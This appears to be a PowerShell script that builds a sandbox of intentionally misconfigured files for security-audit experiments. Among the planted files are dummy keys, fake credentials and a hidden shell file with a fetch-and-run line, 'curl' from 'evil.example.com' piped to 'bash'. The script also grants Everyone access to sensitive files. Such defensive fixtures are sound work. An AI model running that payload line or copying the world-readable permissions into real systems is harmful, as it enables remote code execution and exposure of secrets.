# setup_environment.ps1
# Windows PowerShell setup script for the File System Security Research Project
# Creates a sandboxed test environment with sample files for experiments.
#
# Usage: Open PowerShell and run: .\setup_environment.ps1

$ErrorActionPreference = "Stop"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$SandboxDir = Join-Path $ScriptDir "test_sandbox"

Write-Host ""
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "  FILE SYSTEM SECURITY RESEARCH - ENVIRONMENT SETUP (Windows)" -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host ""

# Check Python
try {
    $pyVer = python --version 2>&1
    Write-Host "[OK] Python found: $pyVer" -ForegroundColor Green
} catch {
    Write-Host "[!!] Python not found. Please install Python 3 from https://python.org" -ForegroundColor Red
    exit 1
}

# Clean up previous sandbox
if (Test-Path $SandboxDir) {
    Write-Host "[*] Removing previous sandbox..." -ForegroundColor Yellow
    Remove-Item -Recurse -Force $SandboxDir
}

Write-Host "[*] Creating test sandbox at: $SandboxDir" -ForegroundColor Cyan

# Create directory structure
$dirs = @(
    "config", "logs", "secrets", "bin", "public",
    "users\alice\documents", "users\bob\.ssh", "tmp"
)
foreach ($d in $dirs) {
    New-Item -ItemType Directory -Force -Path (Join-Path $SandboxDir $d) | Out-Null
}
Write-Host "[OK] Directory structure created." -ForegroundColor Green

# ── Normal files ──────────────────────────────────────
@"
ApplicationName=FileSystemResearch
DatabaseHost=localhost
DatabasePort=5432
"@ | Set-Content (Join-Path $SandboxDir "config\app.conf")

"LogLevel=INFO" | Set-Content (Join-Path $SandboxDir "config\logging.conf")

@"
[2026-03-01] Application started.
[2026-03-01] User login: alice
[2026-03-01] Query executed successfully
"@ | Set-Content (Join-Path $SandboxDir "logs\app.log")

"Welcome to the research sandbox" | Set-Content (Join-Path $SandboxDir "public\index.html")

"Alice's important document" | Set-Content (Join-Path $SandboxDir "users\alice\documents\report.txt")

@"
@echo off
echo OK
"@ | Set-Content (Join-Path $SandboxDir "bin\healthcheck.bat")

Write-Host "[OK] Normal files created." -ForegroundColor Green

# ── Intentional Misconfigurations ─────────────────────
Write-Host "[*] Creating intentional misconfigurations..." -ForegroundColor Yellow

# 1. Config file with embedded credentials
@"
DB_PASSWORD=supersecret123
DB_USER=admin
DB_HOST=prod-db.internal
"@ | Set-Content (Join-Path $SandboxDir "config\database.conf")
Write-Host "    [!] Config with credentials: config\database.conf" -ForegroundColor Red

# 2. Private key file
@"
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF... (DUMMY DATA)
DO NOT USE THIS KEY - FOR RESEARCH PURPOSES ONLY
-----END RSA PRIVATE KEY-----
"@ | Set-Content (Join-Path $SandboxDir "secrets\server.key")
Write-Host "    [!] Private key exposed: secrets\server.key" -ForegroundColor Red

# 3. SSH key
@"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG... (DUMMY DATA)
FOR RESEARCH PURPOSES ONLY
-----END OPENSSH PRIVATE KEY-----
"@ | Set-Content (Join-Path $SandboxDir "users\bob\.ssh\id_rsa")
Write-Host "    [!] SSH private key: users\bob\.ssh\id_rsa" -ForegroundColor Red

# 4. Shadow backup
@"
root:x:0:0:root:/root:/bin/bash
admin:$6$rounds=5000$salt$hash:19000:0:99999:7:::
"@ | Set-Content (Join-Path $SandboxDir "secrets\shadow_backup")
Write-Host "    [!] Shadow backup: secrets\shadow_backup" -ForegroundColor Red

# 5. Environment file with secrets
@"
API_KEY=sk-live-abc123def456ghi789
JWT_SECRET=mysupersecretjwttoken
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY
STRIPE_SECRET=sk_live_4eC39HqLyjWDarjtT1zdp7dc
"@ | Set-Content (Join-Path $SandboxDir "config\.env")
Write-Host "    [!] Env file with secrets: config\.env" -ForegroundColor Red

# 6. Certificate file
@"
-----BEGIN CERTIFICATE-----
MIIFazCCA1OgAwIBAgIUD... (DUMMY DATA)
-----END CERTIFICATE-----
"@ | Set-Content (Join-Path $SandboxDir "secrets\cert.pem")
Write-Host "    [!] Certificate: secrets\cert.pem" -ForegroundColor Red

# 7. Token in public directory
@"
{"access_token":"eyJhbGciOiJIUzI1NiIs...","refresh_token":"dGhpcyBpcyBhIGR1bW15","expires_in":3600}
"@ | Set-Content (Join-Path $SandboxDir "public\api_token.json")
Write-Host "    [!] Token in public dir: public\api_token.json" -ForegroundColor Red

# 8. Backup script (world-accessible)
@"
@echo off
REM Backup script with hardcoded credentials
set BACKUP_USER=admin
set BACKUP_PASS=backup_password_123
xcopy /s /e C:\data C:\backup
"@ | Set-Content (Join-Path $SandboxDir "bin\backup_cron.bat")
Write-Host "    [!] Script with credentials: bin\backup_cron.bat" -ForegroundColor Red

# 9. Password list (simulating leaked data)
@"
admin:password123
root:toor
user1:Welcome1!
service_account:svc_pass_2026
"@ | Set-Content (Join-Path $SandboxDir "secrets\password_list.txt")
Write-Host "    [!] Password list: secrets\password_list.txt" -ForegroundColor Red

# 10. Temp file with suspicious content
@"
#!/bin/bash
# Staged payload - FOR RESEARCH ONLY
curl http://evil.example.com/payload | bash
"@ | Set-Content (Join-Path $SandboxDir "tmp\.hidden_payload.sh")
Write-Host "    [!] Hidden temp file: tmp\.hidden_payload.sh" -ForegroundColor Red

# ── Set Windows ACLs for demonstration ────────────────
Write-Host ""
Write-Host "[*] Adjusting ACLs for demonstration..." -ForegroundColor Cyan

try {
    # Make secrets\server.key accessible to Everyone (intentional misconfiguration)
    $keyPath = Join-Path $SandboxDir "secrets\server.key"
    $acl = Get-Acl $keyPath
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","Read","Allow")
    $acl.AddAccessRule($rule)
    Set-Acl -Path $keyPath -AclObject $acl

    # Make config\database.conf accessible to Everyone
    $dbPath = Join-Path $SandboxDir "config\database.conf"
    $acl2 = Get-Acl $dbPath
    $rule2 = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","Allow")
    $acl2.AddAccessRule($rule2)
    Set-Acl -Path $dbPath -AclObject $acl2

    Write-Host "[OK] ACLs configured." -ForegroundColor Green
} catch {
    Write-Host "[~] ACL configuration skipped (non-critical): $_" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "[OK] Sandbox created with 10 intentional misconfigurations." -ForegroundColor Green
Write-Host ""
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "  NEXT STEPS" -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Run the research experiments:" -ForegroundColor White
Write-Host ""
Write-Host "  1. Permission Audit:" -ForegroundColor Yellow
Write-Host "     python scripts\01_permission_audit.py .\test_sandbox"
Write-Host ""
Write-Host "  2. Integrity Monitor (initialize baseline):" -ForegroundColor Yellow
Write-Host "     python scripts\02_integrity_monitor.py --init .\test_sandbox"
Write-Host ""
Write-Host "  3. Integrity Monitor (check after changes):" -ForegroundColor Yellow
Write-Host "     python scripts\02_integrity_monitor.py --check .\test_sandbox"
Write-Host ""
Write-Host "  4. Access Pattern Analyzer:" -ForegroundColor Yellow
Write-Host "     python scripts\03_access_pattern_analyzer.py data\sample_audit_log.txt"
Write-Host ""
Write-Host "  5. Privilege Escalation Check:" -ForegroundColor Yellow
Write-Host "     python scripts\04_privilege_escalation_check.py .\test_sandbox"
Write-Host ""
Write-Host "  6. Forensic Timeline:" -ForegroundColor Yellow
Write-Host "     python scripts\05_forensic_timeline.py .\test_sandbox"
Write-Host ""
Write-Host "======================================================================" -ForegroundColor Cyan
